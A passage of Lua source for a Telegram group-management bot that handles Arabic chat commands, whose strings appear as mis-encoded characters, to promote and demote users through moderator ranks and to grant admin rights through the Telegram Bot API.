Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
DevRio:sadd(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุฑูุนู ููุดุฆ ุงุณุงุณู")  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--  Rem BasicConstructor  --
if text ==('ุชูุฒูู ููุดุฆ ุงุณุงุณู') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevRio:srem(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชูุฒููู ููุดุฆ ุงุณุงุณู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุชูุฒูู ููุดุฆ ุงุณุงุณู @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ููุดุฆ ุงุณุงุณู @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevRio:srem(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุชูุฒููู ููุดุฆ ุงุณุงุณู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ููุดุฆ ุงุณุงุณู (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ููุดุฆ ุงุณุงุณู (%d+)')
DevRio:srem(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุชูุฒููู ููุดุฆ ุงุณุงุณู")  
end end
if text ==('ุฑูุน ููุดุฆ ุงุณุงุณู') and not Owner(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุฐุง ุงูุงูุฑ ูููุงูููู ูุงููุทูุฑูู ููุท', 1, 'md')
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--    Set  Constructor    --
if BasicConstructor(msg) then
if text ==('ุฑูุน ููุดุฆ') and ChCheck(msg) then
function raf_reply(extra, result, success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
DevRio:sadd(Rinda..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูููุดุฆูู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^ุฑูุน ููุดุฆ @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ููุดุฆ @(.*)')
function promreply(extra,result,success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
if result.id_ then
DevRio:sadd(Rinda..'Rio:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูููุดุฆูู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุฑูุน ููุดุฆ (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ููุดุฆ (%d+)')
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
DevRio:sadd(Rinda..'Rio:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูููุดุฆูู")  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--    Rem  Constructor    --
if text ==('ุชูุฒูู ููุดุฆ') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูููุดุฆูู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุชูุฒูู ููุดุฆ @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ููุดุฆ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูููุดุฆูู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ููุดุฆ (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ููุดุฆ (%d+)')
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูููุดุฆูู")  
end 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--      Set Manager       --
if Constructor(msg) then
if text ==('ุฑูุน ูุฏูุฑ') and ChCheck(msg) then
function prom_reply(extra, result, success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
DevRio:sadd(Rinda..'Rio:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก")  
end  
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุฑูุน ูุฏูุฑ @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ูุฏูุฑ @(.*)')
function promreply(extra,result,success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
if result.id_ then
DevRio:sadd(Rinda..'Rio:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^ุฑูุน ูุฏูุฑ (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ูุฏูุฑ (%d+)')
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
DevRio:sadd(Rinda..'Rio:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก")  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--       Rem Manager      --
if text ==('ุชูุฒูู ูุฏูุฑ') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุชูุฒูู ูุฏูุฑ @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ูุฏูุฑ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ูุฏูุฑ (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ูุฏูุฑ (%d+)')
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก")  
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--       Set Cleaner      --
if text ==('ุฑูุน ููุธู') and ChCheck(msg) then
function prom_reply(extra, result, success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
DevRio:sadd(Rinda..'Rio:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูููุธููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุฑูุน ููุธู @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ููุธู @(.*)')
function promreply(extra,result,success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
if result.id_ then
DevRio:sadd(Rinda..'Rio:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูููุธููู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุฑูุน ููุธู (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ููุธู (%d+)')
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
DevRio:sadd(Rinda..'Rio:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูููุธููู")  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--       Rem Cleaner      --
if text ==('ุชูุฒูู ููุธู') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูููุธููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุชูุฒูู ููุธู @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ููุธู @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูููุธููู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ููุธู (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ููุธู (%d+)')
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูููุธููู")  
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--       Set admin        --
if Manager(msg) then
if text ==('ุฑูุน ุงุฏูู') and ChCheck(msg) then
function prom_reply(extra, result, success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
DevRio:sadd(Rinda..'Rio:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูุงุฏูููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุฑูุน ุงุฏูู @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ุงุฏูู @(.*)')
function promreply(extra,result,success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
if result.id_ then
DevRio:sadd(Rinda..'Rio:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูุงุฏูููู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุฑูุน ุงุฏูู (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ุงุฏูู (%d+)')
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
DevRio:sadd(Rinda..'Rio:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูุงุฏูููู")  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--        Rem admin       --
if text ==('ุชูุฒูู ุงุฏูู') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูุงุฏูููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุชูุฒูู ุงุฏูู @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ุงุฏูู @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูุงุฏูููู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ุงุฏูู (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ุงุฏูู (%d+)')
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูุงุฏูููู")  
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--       Set Vipmem       --
if Admin(msg) then
if text ==('ุฑูุน ูููุฒ') and ChCheck(msg) then
function prom_reply(extra, result, success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
DevRio:sadd(Rinda..'Rio:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููููุฒูู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุฑูุน ูููุฒ @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ูููุฒ @(.*)')
function promreply(extra,result,success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
if result.id_ then
DevRio:sadd(Rinda..'Rio:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููููุฒูู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุฑูุน ูููุฒ (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ูููุฒ (%d+)')
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
DevRio:sadd(Rinda..'Rio:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููููุฒูู")  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--       Rem Vipmem       --
if text ==('ุชูุฒูู ูููุฒ') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููููุฒูู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^ุชูุฒูู ูููุฒ @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ูููุฒ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููููุฒูู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ูููุฒ (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ูููุฒ (%d+)')
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููููุฒูู")  
end end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if RioConstructor(msg) then
if text and text:match("^ุฑูุน ูุดุฑู$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Rinda)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุฑูุนู ูุดุฑู ูู ุงููุฌููุนู")  
else
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐููุณุช ูุฏู ุตูุงุญูุฉ ุงุถุงูุฉ ูุดุฑููู ุฌุฏุฏ ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^ุชูุฒูู ูุดุฑู$") and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Rinda)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุดุฑููู ุงููุฌููุนู")  
else
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐููุณุช ูุฏู ุตูุงุญูุฉ ุงุถุงูุฉ ูุดุฑููู ุฌุฏุฏ ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end 
if text and (text:match("^ุฑูุน ุจูู ุงูุตูุงุญูุงุช$") or text:match("^ุฑูุน ุจูู ุตูุงุญูุงุช$")) and msg.reply_to_message_id_ then
function promote_by_reply(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Rinda)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=True&can_delete_messages=True&can_invite_users=True&can_restrict_members=True&can_pin_messages=True&can_promote_members=True")
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุฑูุนู ูุดุฑู ูู ุฌููุน ุงูุตูุงุญูุงุช")  
else
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐููุณุช ูุฏู ุตูุงุญูุฉ ุงุถุงูุฉ ูุดุฑููู ุฌุฏุฏ ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and (text:match("^ูุถุน ููุจ (.*)$") or text:match("^ุฑูุน ูุดุฑู (.*)$") or text:match("^ุถุน ููุจ (.*)$")) and ChCheck(msg) then
local Rio = text:match("^ูุถุน ููุจ (.*)$") or text:match("^ุฑูุน ูุดุฑู (.*)$") or text:match("^ุถุน ููุจ (.*)$")
function ReplySet(extra, result, success)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Rinda)
local GetInfo = JSON.decode(Check)
if GetInfo.result.can_promote_members == true then 
https.request("https://api.telegram.org/bot"..TokenBot.."/promoteChatMember?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุงุถุงูุฉ โข "..Rio.." ูููุจ ูู")  
https.request("https://api.telegram.org/bot"..TokenBot.."/setChatAdministratorCustomTitle?chat_id="..msg.chat_id_.."&user_id=" ..result.sender_user_id_.."&custom_title="..Rio)
else
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐููุณุช ูุฏู ุตูุงุญูุฉ ุงุถุงูุฉ ูุดุฑููู ุฌุฏุฏ ูุฑุฌู ุงูุชุญูู ูู ุงูุตูุงุญูุงุช', 1, 'md')
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplySet)
end
end
end
if text == 'ููุจู' and ChCheck(msg) then
function ReplyGet(extra, result, success)
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) == false then
send(msg.chat_id_, msg.id_,'โ๏ธฐููุณ ูุฏูู ููุจ ููุง') 
else
send(msg.chat_id_, msg.id_,'โ๏ธฐููุจู โข '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)) 
end
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ReplyGet)
end
end
if text == 'ููุจู' and ChCheck(msg) then
if GetCustomTitle(msg.sender_user_id_,msg.chat_id_) == false then
send(msg.chat_id_, msg.id_,'โ๏ธฐููุณ ูุฏูู ููุจ ููุง') 
else
send(msg.chat_id_, msg.id_,'โ๏ธฐููุจู โข '..GetCustomTitle(msg.sender_user_id_,msg.chat_id_)) 
end
end
if text == "ุฑุงุณููู" and ChCheck(msg) then
RindaTeam = {"ูุง ููุงู","ุงูุทู","ููู","ุชูุถู","ุงุญุจู","ุนูุฑู","ูุงู"};
send(msg.sender_user_id_, 0,RindaTeam[math.random(#RindaTeam)])
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุตูุงุญูุชู" or text == "ุตูุงุญูุงุชู" and ChCheck(msg) then 
if tonumber(msg.reply_to_message_id_) == 0 then 
Validity(msg,msg.sender_user_id_)
end end
if text ==('ุตูุงุญูุชู') or text ==('ุตูุงุญูุงุชู') and ChCheck(msg) then
function ValidityReply(extra, result, success)
Validity(msg,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
